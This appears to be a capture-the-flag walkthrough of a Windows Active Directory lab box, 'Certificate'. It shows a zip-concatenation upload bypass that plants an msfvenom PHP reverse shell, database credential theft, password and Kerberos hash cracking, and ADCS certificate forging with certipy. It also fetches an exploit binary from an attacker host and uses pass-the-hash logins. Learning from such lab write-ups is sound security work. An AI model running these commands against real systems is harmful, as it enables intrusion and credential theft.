![](https://github.com/user-attachments/assets/a5aeea9b-11fe-45a0-a90d-7253e0d90575)

## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.71
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 20:17 +08
Nmap scan report for 10.10.11.71
Host is up (0.0092s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49691/tcp open  unknown
49692/tcp open  unknown
49693/tcp open  unknown
49709/tcp open  unknown
49715/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49691,49692,49693,49709,49715 -sCV 10.10.11.71
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 20:18 +08
Nmap scan report for 10.10.11.71
Host is up (0.0050s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-29 19:53:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-08-29T19:54:33
|_  start_date: N/A
|_clock-skew: mean: 7h34m51s, deviation: 0s, median: 7h34m51s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.35 seconds
```

## 2. Exploring the web site at `80`

### 2.1. Register account

The web site has user account function:

![](https://github.com/user-attachments/assets/251838ab-a158-4190-9cd8-5bd62e873fcf)

Registering as teacher requires verification, so let's register for a student account:

![](https://github.com/user-attachments/assets/9b2735f1-883b-4490-8514-1e518aee5303)

Logging in with the newly registered account grants access to the courses:

![](https://github.com/user-attachments/assets/d55c64b3-f363-4419-acbc-e87073b5bbe8)

### 2.2. Explore course upload

Enroll on a course:

![](https://github.com/user-attachments/assets/8f060852-9d02-4da9-99e0-b0c12c82bcef)

Course outline appears after enrolling, the session links are dummy `#` links, but the quiz submission pages have upload function:

![](https://github.com/user-attachments/assets/de655866-dbed-4b80-a1f2-c9210e4bf00b)

![](https://github.com/user-attachments/assets/f053269e-b03b-444d-b4d9-4b5327c032aa)

The site doesn't accept upload of files types other than those stated:

![](https://github.com/user-attachments/assets/bfd00c9e-5ce0-4297-8de8-38116ad72645)

It also detects if it is able to open the uploaded file:

![](https://github.com/user-attachments/assets/7fdf53e1-2b73-4a78-9162-f28df56552ac)

A proper pdf file uploaded:

![](https://github.com/user-attachments/assets/02e3ff65-67ba-4c28-bc51-76f0bb4c7f76)

The file is available at: `http://certificate.htb/static/uploads/<some-id>/<file>`:

![](https://github.com/user-attachments/assets/45129e07-55f8-4e72-a16f-0fed75448172)

### 2.3. Exploit course upload

The site also accept zip files, let's try to use [zip concatenation](https://www.bleepingcomputer.com/news/security/hackers-now-use-zip-file-concatenation-to-evade-detection/) to evade the upload detection

Generate php reverse shell and setup the zip concatenation:

```console
root@kali:~# mkdir payload && cd $_

root@kali:~/payload# msfvenom -p php/reverse_php LHOST=10.10.14.6 LPORT=4444 -f raw -o malicious/reverse.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2970 bytes
Saved as: malicious/reverse.php

root@kali:~/payload# ls -lR
.:
total 20
drwxr-xr-x 2 root root  4096 Aug 30 09:07 malicious
-rw-r--r-- 1 root root 15812 Aug 30 09:03 test.pdf

./malicious:
total 4
-rw-r--r-- 1 root root 2970 Aug 30 09:07 reverse.php

root@kali:~/payload# zip a.zip test.pdf
  adding: test.pdf (deflated 22%)

root@kali:~/payload# zip -r b.zip malicious
  adding: malicious/ (stored 0%)
  adding: malicious/reverse.php (deflated 69%)

root@kali:~/payload# cat a.zip b.zip > upload.zip
```

The site unzipped the package and shows the link to the test.pdf: http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/test.pdf

Let's see if the reverse shell works:

```sh
curl http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/malicious/reverse.php
```

And the reverse shell is hooked:

```cmd
root@kali:~# rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.71] 61383
whoami
certificate\xamppuser
```

The reverse shell is connected at the upload directory:

```cmd
dir
 Volume in drive C has no label.
 Volume Serial Number is 7E12-22F9

 Directory of C:\xampp\htdocs\certificate.htb\static\uploads\8ad6b1453a685cd6a629959dcfb5039d\malicious

08/29/2025  06:07 PM    <DIR>          .
08/29/2025  06:07 PM    <DIR>          ..
08/29/2025  06:07 PM             2,970 reverse.php
               1 File(s)          2,970 bytes
               2 Dir(s)   4,372,664,320 bytes free
```

List users on the system:

```cmd
dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is 7E12-22F9

 Directory of C:\Users

12/29/2024  06:30 PM    <DIR>          .
12/29/2024  06:30 PM    <DIR>          ..
12/30/2024  09:33 PM    <DIR>          Administrator
11/23/2024  07:59 PM    <DIR>          akeder.kh
11/04/2024  01:55 AM    <DIR>          Lion.SK
11/03/2024  02:05 AM    <DIR>          Public
11/03/2024  08:26 PM    <DIR>          Ryan.K
11/26/2024  05:12 PM    <DIR>          Sara.B
12/29/2024  06:30 PM    <DIR>          xamppuser
               0 File(s)              0 bytes
               9 Dir(s)   4,347,604,992 bytes free
```

## 3. Exploring the database

### 3.1. Database credentials embedded in php code

The database connection code is found at the web root folder:

```cmd
dir C:\xampp\htdocs\certificate.htb\
 Volume in drive C has no label.
 Volume Serial Number is 7E12-22F9

 Directory of C:\xampp\htdocs\certificate.htb

12/30/2024  03:04 PM    <DIR>          .
12/30/2024  03:04 PM    <DIR>          ..
12/24/2024  01:45 AM             7,179 about.php
12/30/2024  02:50 PM            17,197 blog.php
12/30/2024  03:02 PM             6,560 contacts.php
12/24/2024  07:10 AM            15,381 course-details.php
12/24/2024  01:53 AM             4,632 courses.php
12/23/2024  05:46 AM               549 db.php
12/22/2024  11:07 AM             1,647 feature-area-2.php
12/22/2024  11:22 AM             1,331 feature-area.php
12/22/2024  11:16 AM             2,955 footer.php
12/23/2024  06:13 AM             2,351 header.php
12/24/2024  01:52 AM             9,497 index.php
12/25/2024  02:34 PM             5,908 login.php
12/23/2024  06:14 AM               153 logout.php
12/24/2024  02:27 AM             5,321 popular-courses-area.php
12/25/2024  02:27 PM             8,240 register.php
12/26/2024  02:49 AM    <DIR>          static
12/29/2024  12:26 AM            10,366 upload.php
              16 File(s)         99,267 bytes
               3 Dir(s)   4,372,664,320 bytes free
```

The database credentials is embedded in the php code:

```cmd
type C:\xampp\htdocs\certificate.htb\db.php
```

```php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

### 3.2. User credentials in database

Since there was no mysql ports discovered from the nmap scan, let's see if there's a `mysql.exe` to connect the database locally:

```cmd
dir /S C:\*mysql.exe
 Volume in drive C has no label.
 Volume Serial Number is 7E12-22F9

 Directory of C:\xampp\mysql\bin

10/30/2023  05:58 AM         3,784,616 mysql.exe
               1 File(s)      3,784,616 bytes

     Total Files Listed:
               1 File(s)      3,784,616 bytes
               0 Dir(s)   4,347,600,896 bytes free
```

Connect to the database, the `users` table looks interesting:

```cmd
C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "show databases;"
Database
certificate_webapp_db
information_schema
test
C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; show tables;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
```

There are several users in the table, with `admin` user `sara.b` matching the users found on the `C:\Users` folder:

```cmd
C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;"
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      Test    Test    test    test@example.com        $2y$04$YxYfg/64Wt1tX9WDNAjq4ukIyEk7O.58GiB782f3ilkksmSZzon4i    2025-08-30 00:50:44     student 1
```

Password hash cracked with `john`:

```console
root@kali:~# echo '$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6' > hash.txt

root@kali:~# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (?)
1g 0:00:00:00 DONE (2025-08-31 07:47) 2.040g/s 24979p/s 24979c/s 24979C/s monday1..vallejo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Recall that `5985` was discovered from the nmap scan, let's use `evil-winrm` with the discovered credentials to connect
- username: `Sara.B`
- password: `Blink182`

```console
root@kali:~# evil-winrm -i 10.10.11.71 -u Sara.B -p Blink182

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents> whoami
certificate\sara.b
```

## 4. Lateral movement

### 4.1. pcap file for WS-01

Some working files were found in Sara's documents:

```pwsh
*Evil-WinRM* PS C:\Users\Sara.B\Documents> Get-ChildItem -Recurse


    Directory: C:\Users\Sara.B\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/4/2024  12:53 AM                WS-01


    Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap
```

The `Description.txt` convenient hints that some credentials may be lying around:

```pwsh
*Evil-WinRM* PS C:\Users\Sara.B\Documents> Get-Content WS-01\Description.txt
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

Download and review the pcap file:

```pwsh
*Evil-WinRM* PS C:\Users\Sara.B\Documents> download WS-01/WS-01_PktMon.pcap

Info: Downloading C:\Users\Sara.B\Documents\WS-01/WS-01_PktMon.pcap to WS-01_PktMon.pcap

Info: Download successful!
```

Some kerberos packets involving `WS-01` is found in the pcap file:

![](https://github.com/user-attachments/assets/ef40cb5e-baca-41aa-80fd-a6854510134f)

### 4.2. Extracting Kerberos credentials from PCAP

Googling returns a useful utility on GitHub to that parses Kerberos packets from pcap files to extract `AS-REQ`, `AS-REP` and `TGS-REP` hashes: [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser)

```console
root@kali:~/Krb5RoastParser# python krb5_roast_parser.py ../WS-01_PktMon.pcap as_req | tee ws-01-hash.txt
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

Cracking the password hash with hashcat

```console
root@kali:~# hashcat ws-01-hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
⋮

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol
⋮

$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7...e852f0
⋮
```

Credentials found:
- username: `Lion.SK`
- password: `!QAZ2wsx`

## to be updated

```sh
evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'

certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template Delegated-CRA
certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template SignedUser -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\Ryan.k'
apt update && apt -y install ntpsec-ntpdate
ntpdate -q dc01.certificate.htb
timedatectl set-ntp 0
ntpdate dc01.certificate.htb
certipy-ad auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
evil-winrm -i 10.10.11.71 -u Ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6

curl 10.10.14.6/SeManageVolumeExploit.exe -O SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
certutil -exportPFX my "Certificate-LTD-CA" ca.pfx
download ca.pfx
certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -out admin.pfx
certipy-ad auth -pfx admin.pfx -dc-ip 10.10.11.71
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
```
